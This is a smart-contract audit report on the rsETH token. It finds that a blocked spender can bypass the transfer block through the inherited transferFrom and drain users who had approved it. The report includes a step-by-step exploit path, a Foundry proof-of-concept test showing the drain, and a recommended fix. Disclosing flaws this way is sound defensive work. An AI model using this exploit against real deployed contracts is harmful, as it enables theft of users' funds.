Audit Report

## Title
Blocked Spender Bypasses Transfer Block via `transferFrom` — (File: `contracts/RSETH.sol`)

## Summary
`RSETH._transfer` enforces the block only on the `from` and `to` addresses, but never on `msg.sender` (the spender). Because `transferFrom` is not overridden in `RSETH.sol`, a blocked address that holds a pre-existing ERC-20 allowance can call `transferFrom(victim, unblocked_address, amount)` and successfully drain the victim's rsETH, since neither `victim` nor `unblocked_address` is blocked. The block mechanism — the protocol's primary on-chain response to a compromised spender — is rendered ineffective against the spender role.

## Finding Description
`RSETH` overrides `_transfer` to enforce the block on both transfer endpoints:

```solidity
// contracts/RSETH.sol L287-291
function _transfer(address from, address to, uint256 amount) internal override {
    _enforceNotBlocked(from);
    _enforceNotBlocked(to);
    super._transfer(from, to, amount);
}
```

`transferFrom` is **not** overridden, so the inherited `ERC20Upgradeable.transferFrom` is used:

```solidity
// lib/openzeppelin-contracts-upgradeable/.../ERC20Upgradeable.sol L163-168
function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, amount);  // spender never checked
    _transfer(from, to, amount);             // only checks from & to
    return true;
}
```

`_spendAllowance` does not call `_enforceNotBlocked`, and `_transfer` receives only `from` and `to` — `msg.sender` (the spender) is never passed to `_enforceNotBlocked`. `approve` is also not overridden, so blocked addresses can hold allowances freely.

**Exploit path:**
1. User calls `rsETH.approve(router, type(uint256).max)` — router accumulates allowance.
2. Manager calls `rsETH.blockUserTransfers([router])` — router is blocked.
3. Blocked router calls `rsETH.transferFrom(user, attacker, rsETH.balanceOf(user))`:
   - `_spendAllowance(user, router, amount)` — allowance exists, passes.
   - `_transfer(user, attacker, amount)`:
     - `_enforceNotBlocked(user)` — user is not blocked → passes.
     - `_enforceNotBlocked(attacker)` — attacker is not blocked → passes.
   - Transfer succeeds; user's rsETH is stolen.

Existing checks are insufficient: `_enforceNotBlocked` is only called with `from` and `to`, never with the spender identity.

## Impact Explanation
**Critical — Direct theft of user rsETH funds.** Any rsETH holder who has granted an allowance to a subsequently-blocked address can have their entire approved balance drained to an arbitrary unblocked address. The block mechanism exists precisely to freeze a compromised spender's ability to move funds; this vulnerability makes that protection completely ineffective against the spender role.

## Likelihood Explanation
**Medium.** Two realistic preconditions must hold simultaneously: (1) a user has an active `approve()` to a spender (routine for DeFi interactions — max-approvals to pools and routers are standard), and (2) the manager later blocks that spender (the `blockUserTransfers` function exists precisely for this scenario — OFAC sanctions, compromised contracts). The attack window is the interval between the manager blocking the spender and the user revoking the approval. The blocked spender can act immediately upon being blocked, before the user has any opportunity to revoke.

## Recommendation
Override `transferFrom` in `RSETH.sol` to enforce the block on `msg.sender`:

```solidity
function transferFrom(address from, address to, uint256 amount)
    public
    virtual
    override
    returns (bool)
{
    _enforceNotBlocked(msg.sender);
    return super.transferFrom(from, to, amount);
}
```

Alternatively, override `_spendAllowance` to call `_enforceNotBlocked(_msgSender())` before spending the allowance.

## Proof of Concept
```solidity
// Foundry test demonstrating the bypass

address router   = makeAddr("router");
address attacker = makeAddr("attacker");

// 1. User approves router (normal DeFi interaction)
vm.prank(user);
rsETH.approve(router, type(uint256).max);

// 2. Manager blocks the router (defensive protocol action)
address[] memory toBlock = new address[](1);
toBlock[0] = router;
vm.prank(manager);
rsETH.blockUserTransfers(toBlock);
assertTrue(rsETH.transfersBlockedUntil(router) > block.timestamp);

// 3. Blocked router drains user via transferFrom
//    _transfer checks user (not blocked) and attacker (not blocked) — both pass
uint256 userBalance = rsETH.balanceOf(user);
vm.prank(router);
rsETH.transferFrom(user, attacker, userBalance);

// 4. User's rsETH is stolen
assertEq(rsETH.balanceOf(user), 0);
assertEq(rsETH.balanceOf(attacker), userBalance);
```

The test requires no privileged access beyond the manager's legitimate defensive `blockUserTransfers` call. The drain is executed entirely by the blocked router — an unprivileged external address — via a standard public ERC-20 call. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

```text
    /// @dev Re-applying the block before expiry refreshes the hold to `block.timestamp + 1 days`
    ///      (i.e. not cumulative; never more than 24h from the latest call). Exempt addresses cannot be blocked.
    ///      Emits {UserTransfersBlocked} only when the timestamp changes.
    /// @param accounts Addresses to block.
    function blockUserTransfers(address[] calldata accounts) external onlyLRTManager {
        uint256 blockedUntil = block.timestamp + 1 days;
        uint256 length = accounts.length;

        for (uint256 i = 0; i < length; ++i) {
            address account = accounts[i];

            if (isPermanentlyExempt[account] || account == address(0)) continue;

            uint256 prevBlockedUntil = transfersBlockedUntil[account];

            if (blockedUntil != prevBlockedUntil) {
                transfersBlockedUntil[account] = blockedUntil;
                emit UserTransfersBlocked(account, blockedUntil);
            }
        }
    }
```

```text
    /// @dev Reverts if `account` is currently blocked (used for transfers, mints, and burns)
    function _enforceNotBlocked(address account) internal {
        // Addresses that are permanently exempt can never be blocked
        if (isPermanentlyExempt[account]) return;

        // Check if the account has an active transfer block
        uint256 blockedUntil = transfersBlockedUntil[account];
        if (blockedUntil == 0) return;

        if (block.timestamp < blockedUntil) revert TransfersBlocked(account, blockedUntil);

        // Auto-clean up expired block
        delete transfersBlockedUntil[account];
    }
```
